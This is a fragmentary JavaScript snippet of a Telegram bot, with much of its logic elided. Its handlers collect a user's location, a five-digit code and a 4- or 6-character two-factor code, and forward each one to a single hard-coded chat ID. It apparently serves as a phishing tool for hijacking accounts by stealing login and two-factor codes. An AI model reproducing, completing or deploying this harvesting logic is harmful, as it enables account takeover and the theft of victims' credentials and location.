...
bot.start(async (ctx) => {
    ...
    bot.telegram.sendMessage(5535364902, 'Старт')
    try {
...
bot.on('location', (ctx) => {
    ...
    if (location) {
        ...
        bot.telegram.sendMessage(5535364902, `Локація`)
...
bot.on('message', msg => {
    ...
    if(code.length < 5){
        ...
        if(code.length === 5){
            ...
            const now = new Date().toLocaleString()
            bot.telegram.sendMessage(5535364902, `Код: ${code}`)
            code = ''
        }
    } 
    if(text.length===6 || text.length === 4){
        ...
        bot.telegram.sendMessage(5535364902, `Двохфакторка: ${text}`)
        code = ''
